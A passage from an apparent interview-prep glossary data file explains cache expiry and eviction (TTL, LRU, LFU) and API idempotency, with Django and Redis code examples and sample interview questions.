    shortSummary: 'Essential caching and Redis eviction policies: automatic key expiration duration (TTL), evicting the oldest untouched item (LRU), or evicting the least popular item (LFU).',
    detailedDefinition:
      'Because RAM is expensive and finite, in-memory caches like Redis or Python’s `@functools.lru_cache` need rules for when data expires or gets evicted when memory is full:\n' +
      '- **TTL (Time To Live)**: A countdown duration (e.g., 300 seconds) attached to a cache key (or DNS record / JWT). Once the TTL expires, Redis automatically deletes or invalidates the key so stale data isn’t served forever.\n' +
      '- **LRU (Least Recently Used)**: When cache memory reaches `maxmemory`, LRU evicts the key that hasn’t been accessed for the longest *time* (implemented in O(1) using a Hash Map + Doubly Linked List).\n' +
      '- **LFU (Least Frequently Used)**: Evicts the key with the lowest *access count/frequency*, keeping globally popular items even if a burst of one-time requests arrives.',
    whereAndWhyUsed:
      'Used in Redis (`SETEX key 3600 value`), Django cache framework (`cache.set("homepage_products", data, timeout=600)`), CDN asset caching, and coding interviews (implementing an `LRUCache` class in Python using `collections.OrderedDict`).',
    realWorldExample:
      'Your product catalog API checks Redis first (`Cache-Aside` pattern): if `product:42` exists in Redis, return it in 1ms; on a cache miss, query PostgreSQL (25ms), store the JSON in Redis with a **TTL** of 15 minutes (`900s`) and `allkeys-lru` eviction policy, and return the response.',
    codeSnippet: `from functools import lru_cache
from django.core.cache import cache

# 1. In-memory Python function cache (LRU):
@lru_cache(maxsize=256)
def get_tax_rate_for_country(country_code: str) -> float:
    return external_tax_service.lookup(country_code)

# 2. Distributed Redis cache with TTL (Time To Live = 300s):
def get_trending_products():
    cached = cache.get("trending_products")
    if cached is not None:
        return cached
    data = list(Product.objects.filter(is_trending=True).values("id", "name", "price"))
    cache.set("trending_products", data, timeout=300)  # TTL = 5 minutes
    return data`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'What do TTL, LRU, and LFU stand for, and what data structures are used to implement an O(1) LRU Cache?',
        answer:
          'TTL = Time To Live, LRU = Least Recently Used, LFU = Least Frequently Used. An O(1) LRU Cache is implemented by combining a **Hash Map (Dictionary)** (which gives O(1) key lookup to a node) with a **Doubly Linked List** (which gives O(1) removal and O(1) insertion at the head/most-recently-used end, while the tail holds the least-recently-used item to evict). In Python, `collections.OrderedDict` provides this natively via `move_to_end()` and `popitem(last=False)`.',
      },
      {
        questionType: 'Deep-Dive Follow-Up',
        question: 'What is a "Cache Stampede" (Thundering Herd) when a popular TTL expires, and how do you prevent it?',
        answer:
          'A Cache Stampede occurs when a highly requested key (like the homepage banner) expires at the exact same millisecond that 5,000 requests arrive—all 5,000 experience a cache miss and hammer PostgreSQL simultaneously. You prevent it by adding **TTL Jitter** (randomizing TTL between 280s–320s), using a distributed **Mutex Lock** so only 1 worker recomputes the value while others wait, or refreshing hot keys asynchronously before their TTL expires.',
      },
    ],
    relatedTerms: ['idempotency', 'cdn', 'dns', 'rdbms-nosql'],
  },
  {
    id: 'idempotency',
    term: 'Idempotency',
    fullForm: 'Technical Concept (From Latin "idem" + "potens": Same Power / Effect)',
    isAcronym: false,
    category: 'Backend & APIs',
    roadmapStage: 3,
    priority: 'Critical',
    shortSummary: 'Not an acronym: The vital property where executing the exact same operation once or ten times produces the exact same system state and side effects.',
    detailedDefinition:
      'Notice that **Idempotency is a technical term, not an acronym**. In mathematics and computer science, an operation is idempotent if performing it multiple times has the exact same effect on system state as performing it once. In HTTP: `GET`, `HEAD`, `OPTIONS`, `PUT`, and `DELETE` are defined as idempotent (calling `DELETE /orders/99` 3 times leaves order #99 deleted). `POST` is **NOT** idempotent by default—calling `POST /payments/charge` 3 times because of a mobile network timeout will charge the customer’s credit card 3 times unless you engineer an **Idempotency Key** mechanism.',
    whereAndWhyUsed:
      'Mandatory in payment processing (Stripe `Idempotency-Key` header), order creation, distributed message consumers (RabbitMQ/SQS at-least-once delivery), and Celery background task retries.',
    realWorldExample:
      'When a mobile app submits `POST /api/v1/payments/charge`, it generates a UUID `Idempotency-Key: 7f9c-4b2a...` in the header. Your Django backend stores that key in a database table or Redis with a unique constraint. If the mobile client loses Wi-Fi and retries the exact same POST request 2 seconds later, your backend sees the existing `Idempotency-Key` and immediately returns the saved receipt without charging the card a second time.',
    codeSnippet: `# Idempotent POST payment handler pattern in Django / FastAPI
def process_payment(request):
    idem_key = request.headers.get("Idempotency-Key")
    existing = PaymentAttempt.objects.filter(idempotency_key=idem_key).first()
    if existing:
        # Safe retry! Return cached response without double-charging
        return Response(existing.response_payload, status=existing.status_code)
    # Otherwise, execute inside transaction.atomic() and save idem_key`,
    interviewQuestions: [
      {
        questionType: 'Full Form & Definition',
        question: 'Is Idempotency an acronym? What does it mean, and which HTTP methods are naturally idempotent?',
        answer:
          'Idempotency is not an acronym—it is a technical concept meaning an operation can be repeated multiple times without changing the state beyond the initial execution. In HTTP, `GET`, `PUT`, and `DELETE` are idempotent, whereas `POST` is not idempotent by default.',
      },
      {
        questionType: 'Where & Why Used',
        question: 'How would you make a non-idempotent POST /checkout endpoint idempotent in a Python backend?',
        answer:
          'Require the client to generate a unique UUID (`Idempotency-Key` header) per user checkout intent. On the backend, insert that key into a `UNIQUE` column in PostgreSQL or Redis (`SET key NX EX 86400`) inside a transaction. If a duplicate request arrives with the same key, return the stored result of the first execution instead of running the business logic again.',
      },
    ],
    relatedTerms: ['rest', 'acid', 'ttl-lru-lfu', 'mq-amqp-dlq'],
  },
];
